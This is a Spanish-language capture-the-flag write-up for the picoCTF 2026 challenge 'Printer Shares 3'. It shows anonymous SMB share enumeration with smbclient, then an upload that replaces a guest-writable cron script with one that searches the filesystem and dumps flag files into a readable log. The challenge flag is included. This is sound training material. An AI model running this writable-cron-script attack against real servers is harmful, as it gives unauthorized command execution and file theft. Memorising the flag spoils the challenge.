# General Skills — Printer Shares 3

## Descripción
> **Prompt oficial del reto:** "I accidentally left the debug script in place… Well, I think that's fine - No one could possibly access my super secure directory. two printers are on **<puerto>**, one private, one public. you can try `$ nc -vz chatelaine.cylabacademy.net <puerto>`."
>
> **Hints:**
> 1. a suspicious script is running every minute
> 2. this script runs every minute, you might need to wait for a while

- **Categoría:** General Skills
- **Dificultad:** Hard
- **Evento/origen:** picoCTF 2026
- **Autor:** Janice He

## Solución
Igual que [Printer Shares 2](../printer_shares_2/README.md), el "printer" en el puerto es en realidad **Samba smbd 4** (SMB/CIFS). Enumerando los shares sin autenticación hay dos: `shares` (público, con invitados) y `secure-shares` (privado). Esta vez el share público contiene un `script.sh` y un `cron.log`:

```bash
smbclient -L //chatelaine.cylabacademy.net -p <puerto> -N
#   shares          Disk      Public Share With Guests
#   secure-shares   Disk      Printer for internal usage only

smbclient //chatelaine.cylabacademy.net/shares -p <puerto> -N -c "ls"
#   script.sh   (73 bytes)
#   cron.log
```

El `script.sh` es el "debug script" que el autor dejó olvidado, y un cron lo ejecuta **cada minuto** redirigiendo su salida a `cron.log`:

```bash
#!/bin/bash
# this script runs every minute
echo "Health Check: $(date)"
```

La vulnerabilidad: el share público **es escribible por invitados**, así que se puede sobrescribir `script.sh` con código propio. Como el cron captura la salida estándar del script en `cron.log` (que también es leíble desde el share público), basta con hacer que el script busque y vuelque la flag — **RCE vía cron job sobre un script escribible** (clásico: script automatizado + permisos de escritura = game over).

Script subido (ver `exploit_script.sh`):

```bash
#!/bin/bash
echo "Health Check: $(date)"
echo "=== whoami ==="; whoami
echo "=== flag search ==="
for f in $(find / -xdev -iname '*flag*' 2>/dev/null); do
  echo "--- $f ---"
  cat "$f" 2>/dev/null
done
```

```bash
# Subir el script malicioso al share público escribible
smbclient //chatelaine.cylabacademy.net/shares -p <puerto> -N -c "put script.sh script.sh"

# Esperar ~60s a que el cron lo ejecute, luego leer cron.log
sleep 70
smbclient //chatelaine.cylabacademy.net/shares -p <puerto> -N -c "get cron.log"
```

El `cron.log` resultante reveló que el cron corre como el usuario `challenge` y que la flag vive en `/challenge/secure-shares/flag.txt` (directorio accesible solo para ese usuario, no vía el share SMB anónimo):

```
=== whoami ===
challenge
--- /challenge/secure-shares/flag.txt ---
academy{5mb_pr1nter_5h4re5_r3v3r53_3222ebc1}
```

## Notas adicionales
- La diferencia con **Printer Shares 2**: allí había que crackear la contraseña por defecto de un usuario SMB para leer un share privado; aquí el share privado del sistema de archivos (`/challenge/secure-shares/`) no está expuesto por SMB, pero un **script escribible ejecutado por cron** da ejecución de comandos como el usuario dueño de ese directorio — escalando por encima del acceso anónimo de invitado.
- El prompt ("left the debug script in place… no one could access my super secure directory") y los hints apuntan directamente al vector: un script de debug + ejecución periódica por cron. El "super secure directory" (`/challenge/secure-shares/`) sí es inaccesible por SMB, pero no para el proceso del cron.
- Hay que **esperar** al menos un ciclo completo del cron (hasta 60s) entre subir el script y leer `cron.log`; si se lee antes, solo aparecen los "Health Check" viejos.
- Nótese el prefijo de flag `academy{...}` (nuevo branding de CyLab) en vez de `picoCTF{...}` — ambos son válidos en la plataforma.

## Referencias
- Reto: https://learn.cylabacademy.org/library/741
